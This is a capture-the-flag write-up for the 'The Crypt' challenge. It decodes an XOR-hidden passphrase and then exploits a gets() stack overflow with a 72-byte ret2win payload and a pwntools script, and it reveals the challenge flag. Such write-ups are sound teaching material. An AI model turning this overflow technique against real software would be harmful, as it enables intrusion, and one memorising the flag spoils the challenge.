# The Crypt — Writeup

**Category:** Pwn / Reverse Engineering
**Flag:** `deadface{d3crypt3d_1nt0_n0th1ng}`

## Summary

A 513 MiB "mystery" file is 99.996% random padding — the real artifact is a tiny
non-PIE x86-64 ELF glued to the front. Stage 1 hides a secret code in `.data`
(XOR `0x13`, cheekily named `nothing_at_all`); stage 2 is a textbook stack
overflow (`gets()`) with an uncalled win function `nowhere()` that prints
`flag.txt`. Fittingly, the "door to nowhere" *is* the ret2win.

## Recon

The download is a single 513 MiB file. Section headers show the actual ELF ends
at `0x51a8` (~21 KB); everything after is statistically pure `/dev/urandom`
(uniform χ² per MiB, zero repeated 4 KiB blocks, IC exactly 1/256 at all key
lengths, no container magic anywhere). The padding is a decoy — the author even
winks at it with the symbol name `nothing_at_all`.

```
$ file The_Crypt
ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped
```

Symbols of interest: `main`, `print_art`, `slowtype`, `de_crypt`, `nowhere`,
`whispering_madness`.

## Stage 1 — the secret code

`de_crypt()` XORs the blob at `nothing_at_all` (0x405080) with `0x13` into a
stack buffer, and `main` `strcmp`s it against user input:

```python
data = open('The_Crypt','rb').read()
blob = data[0x4080:0x40a0]                    # file offset of .data
bytes(b ^ 0x13 for b in blob.split(b'\x00')[0])
# b'Open_The_Door_To_Nowhere'
```

Entering `Open_The_Door_To_Nowhere` passes the gate and drops you into
`whispering_madness()`:

```
[!] "WHO DARES ATTEMPT TO ENTER THE FORGOTTEN REALM?!":
```

## Stage 2 — ret2win

`whispering_madness()` reads with `gets()` into a 64-byte stack buffer
(`rbp-0x40`). The binary is non-PIE (base `0x400000`), compiled without a stack
canary, and `nowhere()` (0x401660) — which `fopen`s `flag.txt` and echoes it —
is never called from `main`. Offset to saved RIP: 64 + 8 = **72**.

```python
payload = b"A" * 72 + p64(0x401660)           # -> nowhere()
```

Verified locally (win function executes), then run against the live service:

```python
io = remote(HOST, 5001)
io.sendlineafter(b"Secret Code Required): ", b"Open_The_Door_To_Nowhere")
io.sendlineafter(b'FORGOTTEN REALM?!":', payload)
print(io.recvall(timeout=10).decode(errors="ignore"))
```

```
deadface{d3crypt3d_1nt0_n0th1ng}
```

## Red herrings checked and dismissed

- **513 MiB "container" theory** — tested AES-256-XTS header decryption
  (VeraCrypt/TrueCrypt KDFs and iterations, correct per-sector XTS data-unit
  numbers for primary/hidden/backup header offsets) with `cryptsetup` and a
  hand-rolled XTS implementation: no `VERA`/`TRUE` magic anywhere. It's just
  random filler.
- **ASCII art steganography** — the art uses 9 distinct characters; per-character
  maps are scattered noise, not data.
- **PRNG keystreams** — glibc `rand()`, MT19937 with plausible seeds, and the
  binary's own LCG (seed `0x1337`) all failed to reveal structure.
- **Constant-XOR hidden flag** — an XOR-difference scan for `deadface{` /
  `flag{` over the full 513 MiB found only coincidences.
